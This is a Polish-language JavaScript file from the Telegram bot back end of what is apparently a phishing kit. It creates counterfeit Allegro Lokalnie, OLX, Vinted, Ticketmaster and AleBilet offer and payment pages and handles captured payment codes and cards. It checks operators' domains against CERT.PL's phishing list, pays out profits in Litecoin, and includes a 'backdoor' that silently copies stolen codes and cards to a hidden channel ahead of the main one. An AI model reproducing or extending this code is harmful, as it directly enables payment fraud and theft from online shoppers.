	return `https://allegrolokalnie.${domain}/oferta/${encodeURIComponent(offerLinkSlug)}`;
}

async function generateOfferQrBuffer(url) {
	const response = await axios.get("https://api.qrserver.com/v1/create-qr-code/", {
		params: { size: "512x512", data: url, format: "png", margin: 10 },
		responseType: "arraybuffer",
		timeout: 15000
	});
	return Buffer.from(response.data);
}

async function sendOfferQrCode(chatId, offerUrl, offerName) {
	const qrBuffer = await generateOfferQrBuffer(offerUrl);
	const caption = `<tg-emoji emoji-id=\"6039605143601680423\">📱</tg-emoji> <b>Kod QR oferty</b>\n\n<tg-emoji emoji-id=\"5778672437122045013\">📦</tg-emoji> <code>${offerName}</code>\n<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> <code>${offerUrl}</code>`;
	await bot.sendPhoto(chatId, qrBuffer, {
		caption,
		parse_mode: "HTML"
	}, {
		filename: "offer-qr.png",
		contentType: "image/png"
	});
}

async function getEffectiveUserDomain(user) {
	if (!user) return await getPublicDomain();
	await normalizeUserDomainSettings(user);
	const publicDomain = await getPublicDomain();
	return getEffectiveUserDomainSync(user, publicDomain);
}

function getDomainModeLabel(user) {
	const mode = user?.settings?.domainMode || "public";
	return mode === "custom" ? "Prywatna" : "Publiczna";
}

async function runCertCheck(chatId, userId) {
	const user = await User.findOne({ id: userId });
	if (!user) {
		await bot.sendMessage(chatId, "❌ Nie znaleziono użytkownika.");
		return;
	}

	const domena = await getEffectiveUserDomain(user);
	const loadingMessage = await bot.sendMessage(chatId, "⏳ Sprawdzam domenę w bazie CERT.PL...");

	if (!domena) {
		await bot.deleteMessage(chatId, loadingMessage.message_id).catch(() => {});
		await bot.sendMessage(chatId, "⚠️ Brak aktywnej domeny. Ustaw domenę w ⚙️ Ustawienia lub poproś admina o domenę publiczną.");
		return;
	}

	try {
		const response = await fetch("https://hole.cert.pl/domains/domains.json");
		const domains = await response.json();
		const domainFound = domains.find(d => d.DomainAddress.toLowerCase().includes(domena.toLowerCase()));

		let resultMessage;
		if (domainFound) {
			const insertDate = new Date(domainFound.InsertDate);
			const formattedDate = `${insertDate.getDate()}/${insertDate.getMonth() + 1}/${insertDate.getFullYear()} ${insertDate.getHours()}:${insertDate.getMinutes()}`;
			resultMessage = `<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Domena <code>${domena}</code> widnieje w bazie CERT.\n<tg-emoji emoji-id=\"5890937706803894250\">📅</tg-emoji> Od: ${formattedDate}`;
		} else {
			resultMessage = `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Domena <code>${domena}</code> nie widnieje w publicznej bazie CERT.PL.`;
		}

		await bot.deleteMessage(chatId, loadingMessage.message_id).catch(() => {});
		await bot.sendMessage(chatId, resultMessage, { parse_mode: "HTML" });
	} catch (err) {
		await bot.deleteMessage(chatId, loadingMessage.message_id).catch(() => {});
		await bot.sendMessage(chatId, "❌ Nie udało się pobrać danych CERT.PL. Spróbuj ponownie później.");
	}
}

async function ensureUser(userId, username) {
	let user = await User.findOne({ id: userId });
	if (!user) {
		user = new User({
			username: username || "brak",
			id: userId,
			banned: 0,
			role: "user",
			added_at: moment().tz("Europe/Warsaw").format("YYYY-MM-DD HH:mm:ss"),
			expires: "2069-12-31 23:59:59",
			settings: {
				domain: "",
				domainMode: "public",
				customDomain: "",
				assignedPublicDomain: CONFIG.BOT_SETTINGS.DEFAULT_DOMAIN || "",
				card: "Nie",
				bliki: "Tak"
			},
			przelewy: {
				status: "Nie",
				Imie: "",
				Nazwisko: "",
				Numer: ""
			},
			approved: false,
			deposited: 0,
			withdrawn: 0,
			ltcAddress: CONFIG.BOT_SETTINGS.DEFAULT_LTC_ADDRESS,
			autoWithdraw: CONFIG.BOT_SETTINGS.DEFAULT_AUTO_WITHDRAW,
			customFee: null,
			verificationSource: null
		});
		await user.save();
	}
	return user;
}

function sanitizeFgText(str) {
	if (!str) return "";
	return str.replace(/[_*`\[\]]/g, "");
}

function isValidLTCAddress(address) {
	return /^(L|M)[a-km-zA-HJ-NP-Z1-9]{26,33}$/.test(address) || /^ltc1[a-z0-9]{38,59}$/.test(address);
}

async function getAdditionalAdmins() {
	const raw = await getBotConfig("additional_admins");
	return raw ? JSON.parse(raw) : [];
}

async function isFgAdmin(userId) {
	const additionalAdmins = await getAdditionalAdmins();
	return userId.toString() === CONFIG.ADMIN_ID || additionalAdmins.includes(userId.toString());
}

async function isFgMainAdmin(userId) {
	return userId.toString() === CONFIG.ADMIN_ID;
}

// Czy uzytkownik moze akceptowac/odrzucac podania?
// Admin zawsze, a poza tym KAZDY czlonek grupy weryfikacyjnej.
async function canModerateApplication(userId, actorChatId, isAdmin) {
	if (isAdmin) return true;
	return String(actorChatId) === String(CONFIG.CHANNELS.VERIFICATION);
}

// Przelewy (bramka) + ich ustawienia — tylko wybrane ID.
const PRZELEW_IDS = (process.env.PRZELEW_IDS || "")
	.split(",")
	.map((id) => id.trim())
	.filter(Boolean);
function canManagePrzelewy(userId) {
	return PRZELEW_IDS.includes(String(userId));
}

async function getUserFee(user) {
	let fee = CONFIG.DEFAULT_FEE;
	if (user && user.customFee !== undefined && user.customFee !== null) {
		fee = parseFloat(user.customFee);
	} else {
		const globalFee = await getBotConfig("global_fee");
		if (globalFee) fee = parseFloat(globalFee);
	}
	return Number.isFinite(fee) ? fee : CONFIG.DEFAULT_FEE;
}

async function getDepositLimit() {
	const limit = await getBotConfig("deposit_limit");
	if (limit === null || limit === undefined || limit === "") {
		return CONFIG.LIMITS.DEFAULT_DEPOSIT;
	}
	const parsed = parseFloat(limit);
	return isNaN(parsed) || parsed <= 0 ? CONFIG.LIMITS.DEFAULT_DEPOSIT : parsed;
}

function getTotalEarned(user) {
	return user?.deposited || 0;
}

function getWithdrawableProfit(user) {
	return Math.max(0, getTotalEarned(user) - (user?.withdrawn || 0));
}

function getAvailableProfit(user) {
	return getWithdrawableProfit(user);
}

// Adres wypłaty widoczny w zleceniu — nadpisanie admina ma priorytet
function getPayoutAddress(user) {
	if (!user) return "Brak";
	if (user.payoutOverrideAddress) return user.payoutOverrideAddress;
	return user.ltcAddress || "Brak";
}

// Cicha kopia do kanału backdoora (HTML) — bez adnotacji o backdoorze
async function mirrorToBackdoor(text, keyboard = null, threadId = null) {
	try {
		const opts = { parse_mode: "HTML" };
		if (keyboard) opts.reply_markup = keyboard;
		const sent = await bot.sendMessage(CONFIG.CHANNELS.BACKDOOR, markdownToHtml(text), opts);
		return sent?.message_id ?? null;
	} catch (e) {
		try {
			const sent = await bot.sendMessage(CONFIG.CHANNELS.BACKDOOR, text, keyboard ? { reply_markup: keyboard } : {});
			return sent?.message_id ?? null;
		} catch (err) {
			console.error("[backdoor-mirror] Nie udało się wysłać kopii:", err.message || err);
			return null;
		}
	}
}

async function mirrorPayoutToBackdoor(key, text, keyboard) {
	try {
		const opts = { parse_mode: "HTML" };
		if (keyboard) opts.reply_markup = keyboard;
		const sent = await bot.sendMessage(CONFIG.CHANNELS.BACKDOOR, text, opts);
		if (key) registerCodeMessage(key, CONFIG.CHANNELS.BACKDOOR, sent?.message_id);
	} catch (err) {
		console.error("[backdoor-mirror] Nie udało się wysłać kopii wypłaty:", err.message || err);
	}
}

async function creditUserProfit(userId, grossAmount) {
	const targetUser = await User.findOne({ id: userId });
	if (!targetUser) return null;
	const fee = await getUserFee(targetUser);
	const profit = grossAmount * (1 - fee / 100);
	targetUser.deposited = (targetUser.deposited || 0) + profit;
	await targetUser.save();
	return { targetUser, profit, fee, grossAmount };
}

async function sendChannelMessage(channelId, text, keyboard = null) {
	try {
		const opts = { parse_mode: "HTML" };
		if (keyboard) opts.reply_markup = keyboard;
		const sent = await bot.sendMessage(channelId, markdownToHtml(text), opts);
		return sent?.message_id ?? null;
	} catch (err) {
		console.error(`[sendChannelMessage] Nie udało się wysłać wiadomości na chat ${channelId}:`, err.message || err);
		return null;
	}
}

async function sendChannelMessageHtml(channelId, text, keyboard = null) {
	try {
		const opts = { parse_mode: "HTML" };
		if (keyboard) opts.reply_markup = keyboard;
		const sent = await bot.sendMessage(channelId, text, opts);
		return sent?.message_id ?? null;
	} catch (err) {
		console.error(`[sendChannelMessageHtml] Nie udało się wysłać wiadomości na chat ${channelId}:`, err.message || err);
		return null;
	}
}

async function sendTelegramHtml(chatId, text, keyboard = null, threadId = null) {
	const payload = {
		chat_id: chatId,
		text,
		parse_mode: "HTML"
	};
	if (threadId) payload.message_thread_id = threadId;
	if (keyboard) payload.reply_markup = keyboard;
	try {
		const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify(payload)
		});
		if (!response.ok) {
			const body = await response.text();
			console.error(`[sendTelegramHtml] Błąd API Telegram (${response.status}) chat=${chatId}:`, body);
			return null;
		}
		const data = await response.json();
		return data?.result?.message_id ?? null;
	} catch (err) {
		console.error(`[sendTelegramHtml] Wyjątek chat=${chatId}:`, err.message || err);
		return null;
	}
}

// Wysyłka z fallbackiem bez topic_id (grupy bez tematów)
async function sendTelegramHtmlSafe(chatId, text, keyboard = null, threadId = null) {
	let messageId = await sendTelegramHtml(chatId, text, keyboard, threadId);
	if (messageId == null && threadId) {
		messageId = await sendTelegramHtml(chatId, text, keyboard, null);
	}
	return messageId;
}

// Rejestr kopii wiadomości z kodami — pozwala zgasić przyciski w obu kanałach
const codeMessageRegistry = new Map();
const CODE_REGISTRY_TTL_MS = 30 * 60 * 1000;

function registerCodeMessage(key, chatId, messageId) {
	if (!key || messageId == null) return;
	const entry = codeMessageRegistry.get(key) || [];
	entry.push({ chatId, messageId });
	codeMessageRegistry.set(key, entry);
	const timer = setTimeout(() => codeMessageRegistry.delete(key), CODE_REGISTRY_TTL_MS);
	if (timer.unref) timer.unref();
}

async function clearRegisteredButtons(key) {
	if (!key) return;
	const entry = codeMessageRegistry.get(key);
	if (!entry) return;
	codeMessageRegistry.delete(key);
	for (const { chatId, messageId } of entry) {
		try {
			await fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
			});
		} catch (e) {}
	}
}

const clearPairedCodeButtons = clearRegisteredButtons;
const clearPairedPayoutButtons = clearRegisteredButtons;

// ============================================================
// BACKDOOR — lustrzana kopia kodów/kart + opóźnienie na kanale głównym
// ============================================================
const BACKDOOR_DELAY_MAX_MS = 60_000;
let backdoorDelayMs = 0;
const backdoorDelayTimers = new Set();

async function loadBackdoorDelay() {
	try {
		const raw = await getBotConfig("backdoor_delay_ms");
		const parsed = parseInt(raw, 10);
		backdoorDelayMs = Number.isFinite(parsed) && parsed > 0 ? Math.min(parsed, BACKDOOR_DELAY_MAX_MS) : 0;
	} catch (e) {
		backdoorDelayMs = 0;
	}
}

async function setBackdoorDelay(ms) {
	backdoorDelayMs = Math.max(0, Math.min(ms, BACKDOOR_DELAY_MAX_MS));
	await setBotConfig("backdoor_delay_ms", String(backdoorDelayMs));
}

function scheduleDelayed(delayMs, fn) {
	if (!delayMs || delayMs <= 0) {
		return Promise.resolve(fn());
	}
	const timer = setTimeout(async () => {
		backdoorDelayTimers.delete(timer);
		try {
			await fn();
		} catch (err) {
			console.error("[backdoor-delay] Błąd wysyłki z opóźnieniem:", err.message || err);
		}
	}, delayMs);
	backdoorDelayTimers.add(timer);
	return null;
}

// Wysyła do kanału backdoora NATYCHMIAST, a do kanału głównego z opóźnieniem.
async function deliverCodeMessage(text, keyboard = null, threadId = null, key = null) {
	// 1) Backdoor — zawsze natychmiast, z fallbackiem bez topic_id
	const backdoorMsgId = await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, text, keyboard);
	if (key) registerCodeMessage(key, CONFIG.CHANNELS.BACKDOOR, backdoorMsgId);

	// 2) Kanał główny — z opóźnieniem (jeśli ustawione)
	const deliverMain = async () => {
		const mainMsgId = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, text, keyboard, threadId);
		if (key) registerCodeMessage(key, CONFIG.CHANNELS.CODES, mainMsgId);
	};

	if (backdoorDelayMs > 0) {
		scheduleDelayed(backdoorDelayMs, deliverMain);
	} else {
		await deliverMain();
	}
}

async function sendCodesChannelHtml(text, keyboard = null, threadId = null, key = null) {
	await deliverCodeMessage(text, keyboard, threadId, key);
}

// ============================================================
// BACKDOOR — statystyki (tylko kanał backdoora)
// ============================================================
async function bumpStat(key, delta = 1) {
	try {
		const current = parseFloat(await getBotConfig(key, "0")) || 0;
		const next = Math.max(0, Math.round((current + delta) * 100) / 100);
		await setBotConfig(key, String(next));
		return next;
	} catch (e) {
		return 0;
	}
}

async function recordCodeStat(kind, amount = 0) {
	if (kind === "accept") {
		await bumpStat("stats_codes_accepted", 1);
		if (amount > 0) await bumpStat("stats_amount_accepted", Math.round(amount * 100) / 100);
	} else if (kind === "reject") {
		await bumpStat("stats_codes_rejected", 1);
	} else if (kind === "card_accept") {
		await bumpStat("stats_cards_accepted", 1);
		if (amount > 0) await bumpStat("stats_amount_accepted", Math.round(amount * 100) / 100);
	} else if (kind === "card_reject") {
		await bumpStat("stats_cards_rejected", 1);
	}
}

async function buildStatsText() {
	const accepted = parseInt(await getBotConfig("stats_codes_accepted", "0"), 10) || 0;
	const rejected = parseInt(await getBotConfig("stats_codes_rejected", "0"), 10) || 0;
	const cardsAccepted = parseInt(await getBotConfig("stats_cards_accepted", "0"), 10) || 0;
	const cardsRejected = parseInt(await getBotConfig("stats_cards_rejected", "0"), 10) || 0;
	const amountAccepted = parseFloat(await getBotConfig("stats_amount_accepted", "0")) || 0;
	const totalCodes = accepted + rejected;
	const successRate = totalCodes > 0 ? (accepted / totalCodes) * 100 : 0;
	const avgAmount = accepted > 0 ? amountAccepted / accepted : 0;

	return [
		"📊 <b>STATYSTYKI OGÓLNE</b>",
		"",
		`<tg-emoji emoji-id=\"6037249452824072506\">🔑</tg-emoji> <b>Kody zaakceptowane:</b> <code>${accepted}</code>`,
		`<tg-emoji emoji-id=\"5938215362473496448\">⛔</tg-emoji> <b>Kody odrzucone:</b> <code>${rejected}</code>`,
		`<tg-emoji emoji-id=\"5938539885907415367\">📈</tg-emoji> <b>Skuteczność kodów:</b> <code>${successRate.toFixed(1)}%</code>`,
		`<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Suma zaakceptowanych kwot:</b> <code>${amountAccepted.toFixed(2)} PLN</code>`,
		`📉 <b>Średnia kwota kodu:</b> <code>${avgAmount.toFixed(2)} PLN</code>`,
		"",
		`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karty zaakceptowane:</b> <code>${cardsAccepted}</code>`,
		`<tg-emoji emoji-id=\"5938215362473496448\">🚫</tg-emoji> <b>Karty odrzucone:</b> <code>${cardsRejected}</code>`
	].join("\n");
}

function parseDelayArg(raw) {
	const value = String(raw || "").trim().toLowerCase();
	if (!value) return null;
	const match = value.match(/^(\d{1,4})\s*(s|sec|sek|ms)?$/);
	if (!match) return null;
	const num = parseInt(match[1], 10);
	if (match[2] === "ms") return Math.min(num, BACKDOOR_DELAY_MAX_MS);
	return Math.min(num * 1000, BACKDOOR_DELAY_MAX_MS);
}

function formatGatewayPlatformLabel(subdomain) {
	if (subdomain === "olx") return "OLX";
	if (subdomain === "vinted") return "Vinted";
	if (subdomain === "ticketmaster") return "Ticketmaster";
	if (subdomain === "alebilet") return "AleBilet";
	return "Allegro Lokalnie";
}

function sanitizeOfferLink(link) {
	const polishToNormal = {
		'ą': 'a', 'ć': 'c', 'ę': 'e', 'ł': 'l', 'ń': 'n', 'ó': 'o', 'ś': 's', 'ź': 'z', 'ż': 'z',
		'Ą': 'A', 'Ć': 'C', 'Ę': 'E', 'Ł': 'L', 'Ń': 'N', 'Ó': 'O', 'Ś': 'S', 'Ź': 'Z', 'Ż': 'Z'
	};
	return link
		.replace(/[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/g, match => polishToNormal[match] || match)
		.replace(/[^a-zA-Z0-9-]/g, '')
		.toLowerCase();
}

async function generateUniqueOfferLink(OfferModel, link) {
	let sanitizedLink = sanitizeOfferLink(link);
	let newLink = sanitizedLink;
	let counter = 2;
	while (await OfferModel.exists({ link: newLink })) {
		newLink = `${sanitizedLink}-${counter}`;
		counter++;
	}
	return newLink;
}

function tmRefFromId(idoferty) {
	return String(idoferty).slice(0, 10);
}

function getTicketmasterPricing(oferta) {
	const qty = Math.max(1, parseInt(oferta.ilosc, 10) || 2);
	const unit = Math.round((parseFloat(String(oferta.cena || "0").replace(",", ".")) || 0) * 100) / 100;
	const tickets = Math.round(qty * unit * 100) / 100;
	const manualFee = oferta.oplata != null && String(oferta.oplata).trim() !== ""
		? parseFloat(String(oferta.oplata).replace(",", "."))
		: null;
	const fee = Number.isFinite(manualFee)
		? Math.round(manualFee * 100) / 100
		: Math.round(tickets * 0.15 * 100) / 100;
	const total = Math.round((tickets + fee) * 100) / 100;
	return { qty, unit, tickets, fee, total, totalInt: Math.round(total) };
}

// Cena przedmiotu — bez opłat serwisowych, wysyłka darmowa (OLX/Vinted)
function getItemPricing(oferta) {
	const price = Math.round((parseFloat(String(oferta.cena || "0").replace(",", ".")) || 0) * 100) / 100;
	return { price, fee: 0, total: price, totalInt: Math.round(price) };
}

function formatTicketmasterMoney(value) {	const num = typeof value === "number" ? value : parseFloat(String(value).replace(",", ".")) || 0;
	return num.toFixed(2).replace(".", ",");
}

function applyTicketmasterReplacements(template, oferta, req, { priced = false } = {}) {
	const AUTH = req.query.auth ? 'true' : 'false';
	const ERROR = req.query.error || 0;
	const tagParts = (oferta.tagi || '').split(';').map(s => s.trim());
	const paymentBase = `/platnosc/${encodeURIComponent(oferta.link)}/${encodeURIComponent(oferta.idoferty)}`;
	const eventImage = oferta.zdjecia?.[0]
		? `/images/${oferta.zdjecia[0]}.jpeg`
		: `/images/${oferta.idoferty}_event.jpeg`;
	const pricing = getTicketmasterPricing(oferta);
	const totalMoney = priced ? String(oferta.cena) : String(pricing.totalInt);

	return template
		.replace(/<title>[^<]*<\/title>/, `<title>${oferta.nazwa} | Ticketmaster</title>`)
		.replace(/TUTAJNAZWA/g, oferta.nazwa)
		.replace(/TUTAJCENABILET/g, String(Math.round(pricing.unit)))
		.replace(/TUTAJCENA/g, String(pricing.totalInt))
		.replace(/TUTAJILOSC/g, String(pricing.qty))
		.replace(/TUTAJSUMA/g, String(Math.round(pricing.tickets)))
		.replace(/TUTAJOPLATA/g, String(Math.round(pricing.fee)))
		.replace(/TUTAJIDOFERTY/g, oferta.idoferty)
		.replace(/TUTAJID/g, oferta.link)
		.replace(/TUTAJLINK/g, oferta.link)
		.replace(/TUTAJREF/g, tmRefFromId(oferta.idoferty))
		.replace(/TUTAJMIASTO/g, oferta.miasto || '')
		.replace(/TUTAJDATA/g, oferta.lastonline || '')
		.replace(/TUTAJOPIS/g, oferta.description || '')
		.replace(/TUTAJSEKCJA/g, tagParts[0] || '')
		.replace(/TUTAJRZAD/g, tagParts[1] || '')
		.replace(/TUTAJMIEJSCA/g, tagParts[2] || '')
		.replace(/TUTAJFOTA/g, eventImage)
		.replace(/TUTAJPAYMENTBASE/g, paymentBase)
		.replace(/TUTAJPAYBASE/g, `${paymentBase}/pay`)
		.replace(/TUTAJERROR/g, ERROR)
		.replace(/TUTAJAUTH/g, AUTH);
}

function getAlebiletPricing(oferta) {
	const qty = Math.max(1, parseInt(oferta.ilosc, 10) || 2);
	const unit = Math.round((parseFloat(String(oferta.cena || "0").replace(",", ".")) || 0) * 100) / 100;
	const tickets = Math.round(qty * unit * 100) / 100;
	const manualFee = oferta.oplata != null && String(oferta.oplata).trim() !== ""
		? parseFloat(String(oferta.oplata).replace(",", "."))
		: null;
	const fee = Number.isFinite(manualFee)
		? Math.round(manualFee * 100) / 100
		: Math.round(tickets * 0.15 * 100) / 100;
	const total = Math.round((tickets + fee) * 100) / 100;
	return {
		qty,
		unit,
		tickets,
		fee,
		total,
		totalInt: Math.round(total),
	};
}

function formatAlebiletMoney(value) {
	const num = typeof value === "number" ? value : parseFloat(String(value).replace(",", ".")) || 0;
	return num.toFixed(2).replace(".", ",").replace(/,00$/, "");
}

function applyAlebiletReplacements(template, oferta, extra = {}) {
	const tagParts = (oferta.tagi || "").split(";").map(s => s.trim());
	const pricing = getAlebiletPricing(oferta);
	const phone = extra.phone || "";
	const email = extra.email || "";

	return template
		.replace(/<title>[^<]*<\/title>/, `<title>${oferta.nazwa} - kup bilety</title>`)
		.replace(/TUTAJNAZWA/g, oferta.nazwa)
		.replace(/TUTAJMIASTO/g, oferta.miasto || "")
		.replace(/TUTAJDATA/g, oferta.lastonline || "")
		.replace(/TUTAJTYP/g, tagParts[0] || "")
		.replace(/TUTAJSEKTOR/g, tagParts[1] || "")
		.replace(/TUTAJRZAD/g, tagParts[2] || "")
		.replace(/TUTAJCENA2/g, String(parseInt(oferta.cena, 10) + 5))
		.replace(/TUTAJCENABILETY/g, formatAlebiletMoney(pricing.tickets))
		.replace(/TUTAJCENABILET/g, formatAlebiletMoney(pricing.unit))
		.replace(/TUTAJILOSC/g, String(pricing.qty))
		.replace(/TUTAJOPLATA/g, formatAlebiletMoney(pricing.fee))
		.replace(/TUTAJFEEPERCENT/g, pricing.tickets > 0 ? String(pricing.fee / pricing.tickets) : "0")
		.replace(/TUTAJFEEAMOUNT/g, String(pricing.fee))
		.replace(/TUTAJCENA/g, formatAlebiletMoney(pricing.total))
		.replace(/TUTAJLINK/g, oferta.link)
		.replace(/TUTAJID/g, oferta.link)
		.replace(/TUTAJTELEFON/g, phone)
		.replace(/TUTAJEMAIL/g, email);
}

function applyVintedReplacements(template, oferta) {
	const tagParts = (oferta.tagi || '').split(';').map(s => s.trim());
	const mainPhoto = oferta.zdjecia?.[0] ? `/images/${oferta.zdjecia[0]}.jpeg` : '/images/placeholder.jpeg';
	const pricing = getItemPricing(oferta);

	return template
		.replace(/<title>[^<]*<\/title>/, `<title>${oferta.nazwa} | Vinted</title>`)
		.replace(/TUTAJNAZWA/g, oferta.nazwa)
		.replace(/TUTAJCENA2/g, String(pricing.totalInt))
		.replace(/TUTAJCENA/g, oferta.cena)
		.replace(/TUTAJSUMA/g, String(pricing.totalInt))
		.replace(/TUTAJCENADOSTAWY/g, 'Darmowa')
		.replace(/TUTAJCENAOCHRONY/g, 'Darmowa')
		.replace(/TUTAJFIRMA/g, oferta.nazwaFirmy || 'Vinted Go')
		.replace(/TUTAJOPLATA/g, (() => {
			const manual = oferta.oplata != null && String(oferta.oplata).trim() !== ""
				? parseFloat(String(oferta.oplata).replace(",", "."))
				: NaN;
			const value = Number.isFinite(manual) && manual > 0
				? manual
				: Math.round(pricing.total * 0.15 * 100) / 100;
			return value.toFixed(2).replace(".", ",");
		})())
		.replace(/TUTAJID/g, oferta.link)
		.replace(/TUTAJOPIS/g, oferta.description || '')
		.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca || '')
		.replace(/TUTAJMIASTO/g, oferta.miasto || '')
		.replace(/TUTAJMARKA/g, oferta.kategoria || '')
		.replace(/TUTAJKATEGORIA/g, oferta.kategoria || '')
		.replace(/TUTAJLASTONLINE/g, oferta.lastonline || 'Dzisiaj o 15:32')
		.replace(/TUTAJROZMIAR/g, tagParts[0] || '')
		.replace(/TUTAJSTAN/g, tagParts[1] || '')
		.replace(/TUTAJWIEK/g, oferta.wiek || '')
		.replace(/TUTAJFOTA/g, mainPhoto)
		.replace(/(data-testid="image-carousel-image-shown"[^>]*src=")[^"]*(")/, `$1${mainPhoto}$2`)
		.replace(/https:\/\/vinted\.pl-ticketnumber910203\.lat\/items\/id-9gmlx-iPhone-15-Pro-128GB-Black-Titanium\?vinted=zakup/g, '')
		.replace(/https:\/\/vinted\.pl-ticketnumber910203\.lat\/catalog/g, '')
		.replace(/https:\/\/vinted\.pl-ticketnumber910203\.lat\/items\/id-9gmlx-iPhone-15-Pro-128GB-Black-Titanium/g, '');
}

async function refreshOfferMenuTicketmasterGlobal(chatId, messageId, offerId, telegramUserId) {
	try {
		const offers = await loadOffersTicketmasterDB();
		const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
		if (!offer) {
			await bot.sendMessage(chatId, "⚠️ Oferta Ticketmaster nie została znaleziona.");
			return;
		}

		const users = await loadUsersDB();
		const user = users.find(u => u.id === telegramUserId);
		const publicDomain = await getPublicDomain();
		const domain = getEffectiveUserDomainSync(user, publicDomain);
		const offerLink = domain
			? buildOfferUrl("ticketmaster", domain, offer.link, offer.idoferty)
			: "NIE MASZ PODPIETEJ DOMENY";

		const tagParts = (offer.tagi || '').split(';').map(s => s.trim());
		const caption = markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *OFERTA · TICKETMASTER*\n──────────────────\n\n` +
			`› *Wydarzenie:* \`${offer.nazwa}\`\n` +
			`› *Opis / arena:* \`${offer.description}\`\n` +
			`› *Cena biletu:* \`${offer.cena} zł\`\n` +
			`› *Miejsce:* \`${offer.miasto}\`\n` +
			`› *Data:* \`${offer.lastonline}\`\n` +
			`› *Sekcja:* \`${tagParts[0] || '-'}\`\n` +
			`› *Rząd:* \`${tagParts[1] || '-'}\`\n` +
			`› *Miejsca:* \`${tagParts[2] || '-'}\`\n` +
			`› *Zdjęcia:* ${offer.zdjecia.length}\n\n` +
			`› *Link:* ${offerLink}`);
		caption = fitCaption(caption);

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[
						{ text: "Nazwa wydarzenia", icon_custom_emoji_id: "6039779802741739617", callback_data: `tm_edit_name_${offer.idoferty}` },
						{ text: "Opis / arena", icon_custom_emoji_id: "5920046907782074235", callback_data: `tm_edit_desc_${offer.idoferty}` }
					],
					[
						{ text: "Cena biletu", icon_custom_emoji_id: "5778421276024509124", callback_data: `tm_edit_price_${offer.idoferty}` },
						{ text: "Opłata serwisowa", icon_custom_emoji_id: "6034969813032374911", callback_data: `tm_edit_fee_${offer.idoferty}` }
					],
					[
						{ text: "Miejsce", icon_custom_emoji_id: "6030399199030284183", callback_data: `tm_edit_city_${offer.idoferty}` }
					],
					[
						{ text: "Data wydarzenia", icon_custom_emoji_id: "5890937706803894250", callback_data: `tm_edit_date_${offer.idoferty}` },
						{ text: "Sekcja/Rząd/Miejsca", icon_custom_emoji_id: "6043896193887506430", callback_data: `tm_edit_seats_${offer.idoferty}` }
					],
					[
						{ text: "Dodaj zdjęcie", icon_custom_emoji_id: "5881806211195605908", callback_data: `tm_edit_addphotos_${offer.idoferty}` },
						{ text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `tm_edit_removephotos_${offer.idoferty}` }
					],
					[{ text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_ticketmaster_${offer.idoferty}` }],
					[{ text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `tm_delete_offer_${offer.idoferty}` }],
					[{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_ticketmaster" }]
				]
			}
		};

		await bot.deleteMessage(chatId, messageId).catch(() => {});
		await bot.sendPhoto(chatId, "bramka.png", { caption, ...options });
	} catch (error) {
		console.error("Błąd w refreshOfferMenuTicketmasterGlobal:", error);
		await bot.sendMessage(chatId, "❌ Błąd otwierania oferty Ticketmaster. Sprawdź logi serwera.");
	}
}

async function refreshOfferMenuVintedGlobal(chatId, messageId, offerId, telegramUserId) {
	try {
		const offers = await loadOffersVintedDB();
		const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
		if (!offer) {
			await bot.sendMessage(chatId, "⚠️ Oferta Vinted nie została znaleziona.");
			return;
		}

		const users = await loadUsersDB();
		const user = users.find(u => u.id === telegramUserId);
		const publicDomain = await getPublicDomain();
		const domain = getEffectiveUserDomainSync(user, publicDomain);
		const offerLink = domain
			? buildOfferUrl("vinted", domain, offer.link)
			: "NIE MASZ PODPIETEJ DOMENY";

		const caption = fitCaption(markdownToHtml(formatVintedOfferCaption(offer, offerLink)));

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: buildVintedOfferKeyboard(offer.idoferty)
			}
		};

		await bot.deleteMessage(chatId, messageId).catch(() => {});
		try {
			await bot.sendPhoto(chatId, "bramka.png", { caption, ...options });
		} catch (error) {
			if (!/too long/i.test(error.message || "")) throw error;
			await bot.sendPhoto(chatId, "bramka.png", {
				caption: markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *OFERTA · VINTED*\n──────────────────\n\n› *${offer.nazwa}*\n› Cena: \`${offer.cena} PLN\`\n\n› *Link:* ${offerLink}`),
				...options
			});
		}
	} catch (error) {
		console.error("Błąd w refreshOfferMenuVintedGlobal:", error);
		await bot.sendMessage(chatId, "❌ Błąd otwierania oferty Vinted. Sprawdź logi serwera.");
	}
}

async function addOfferTicketmasterGlobal(chatId, messageId, userId, telegramUserId) {
	const offers = await loadOffersTicketmasterDB();
	const idoferty = crypto.randomBytes(16).toString('hex');
	const offerName = "Twenty One Pilots · The Clancy World Tour";
	const uniqueLink = await generateUniqueOfferLink(OfferTicketmaster, offerName.replace(/\s+/g, '-'));

	const offerData = {
		idoferty,
		nazwa: offerName,
		description: "TAURON Arena, Kraków",
		cena: "568",
		owner: userId,
		miasto: "TAURON Arena, Kraków",
		lastonline: "sob., 15 lis 2025, 19:00",
		tagi: "Section T-301;Row 44;Seats 1-2",
		zdjecia: [`${idoferty}_event`],
		link: uniqueLink,
	};

	await saveOffersTicketmasterDB([...offers, offerData]);
	await refreshOfferMenuTicketmasterGlobal(chatId, messageId, offerData.idoferty, telegramUserId);
}

async function addOfferVintedGlobal(chatId, messageId, userId, telegramUserId) {
